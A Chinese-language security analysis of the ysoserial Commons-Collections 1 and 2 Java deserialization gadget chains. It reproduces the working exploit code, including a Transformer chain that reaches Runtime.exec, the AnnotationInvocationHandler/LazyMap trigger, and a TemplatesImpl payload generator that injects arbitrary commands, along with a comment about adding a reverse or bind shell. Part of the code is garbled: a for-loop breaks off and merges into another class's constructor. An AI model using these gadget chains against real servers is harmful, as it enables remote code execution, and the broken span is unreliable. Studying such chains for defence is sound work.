**作者：深信服千里目安全实验室  
原文链接：**
## **Commons-Collections 1**
首先构造transformers反射链，调用ChainedTransformer方法封装transformers数组，串联三次反射。
    final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
        new InvokerTransformer("exec",new Class[] { String.class }, execArgs)
    };
    final Transformer transformerChain = new ChainedTransformer(transformers);
InvokerTransformer sink点解析：
首先跟踪base sink点 InvokerTransformer#transform
方法，以及InvokerTransformer构造方法。在InvokerTransformer#transform(Object
input)方法中调用了invoke方法
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
invoke方法存在三个输入点，分别是method对象，input和this.iArgs两个形参。其中input作为transform的传入参数（此参数是否可控取决于transform方法被调用时，传入参数是否可控）。this.iArgs是可以通过调用
**InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)**
构造方法进行赋值。
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
method对象可以通过调用 **cls.getMethod(this.iMethodName, this.iParamTypes)**
获取，其中getMethod方法的两个形参，也均可以通过调用上述的InvokerTransformer构造方法进行赋值。此时的method方法可以是任意类中的任意方法对象。
此时，如果可以控制transform方法的传入参数，就可以通过invoke方法，调用任意类中的任意方法。
**目前存在的问题：**
（1）如果可以找到满足条件的transform方法，也仅仅可以调用一次反射。然而构造一个可以执行任意命令的恶意Runtime对象，需要调用三次反射。
（2）如何控制控制InvokerTransformer#transform方法的传入参数。
**针对问题1** ，工具作者找到了ChainedTransformer类。
通过调用ChainedTransformer构造函数，生成Transformer数组对象。
    public ChainedTransformer(Transformer[] transformers) {
        super();
        iTransformers = transformers;
    }
且调用 **ChainedTransformer#transform**
方法，可以依次调用Transformer数组中的Transformer对象，因此完成transform三次反射方法的串联。
    public Object transform(Object object) {
        for (int i = 0; i  var1, Map var2) {
        this.type = var1;
        this.memberValues = var2;
    }
且AnnotationInvocationHandler继承Serializable，可以反序列化，跟踪一下反序列化入口的readObject方法。
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;
        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }
        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();
        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }
    }
在readObject方法里调用 **this.memberValues.entrySet().iterator()**
方法，其中this.memberValues可以通过调用AnnotationInvocationHandler构造方法，赋值为LazyMap对象，且LazyMap对象被创建动态代理类，代理接口为Map.class，当调用Map.class类中的方法时，将会调用AnnotationInvocationHandler#invoke方法。entrySet方法是Map.class中的方法，因此会进入AnnotationInvocationHandler#invoke方法中，并调用
**this.memberValues.get(var4)** 方法，其中 **this.memberValues**
是LazyMap，因此完成了sink点的串联，完成整个gadget的构造。
## **Commons-Collections 2**
首先分析sink点，作者调用了自定义方法Gadgets.createTemplatesImpl生成TemplatesImpl对象。具体跟踪一下生成过程。
首先进入到Gadgets#createTemplatesImpl方法中。
    public static Object createTemplatesImpl ( final String command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                command,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }
        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }
在类中重载createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class,
TransformerFactoryImpl.class)方法，并传入cmd恶意命令和
**org.apache.xalan.xsltc.trax.TemplatesImpl.class、org.apache.xalan.xsltc.runtime.AbstractTranslet.class、org.apache.xalan.xsltc.trax.TransformerFactoryImpl.class**
。重点跟踪一下cmd是如何被注入在利用链中。
    public static  T createTemplatesImpl ( final String command, Class tplClass, Class abstTranslet, Class transFactory ) throws Exception {
        final T templates = tplClass.newInstance();
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
            "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();
        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });
        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }
结合Javasist库的相关方法，分析createTemplatesImpl方法：
    ClassPool pool = ClassPool.getDefault();  //创建一个ClassPool实例化对象，ClassPool是一个存放着代表class文件的CtClass类容器
    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));  //将StubTransletPayload.class的路径加到类搜索路径中。(通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的问题)
    pool.insertClassPath(new ClassClassPath(abstTranslet));  //同理，将org.apache.xalan.xsltc.runtime.AbstractTranslet.class的路径加到类搜索路径中。
    final CtClass clazz = pool.get(StubTransletPayload.class.getName());  //获取StubTransletPayload的CtClass对象，用于后续的编辑。
    String cmd = "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") + "\");";  //声明cmd属性对象，并注入传入的command参数。
    clazz.makeClassInitializer().insertAfter(cmd);  //clazz.makeClassInitializer() -> 新增静态代码块。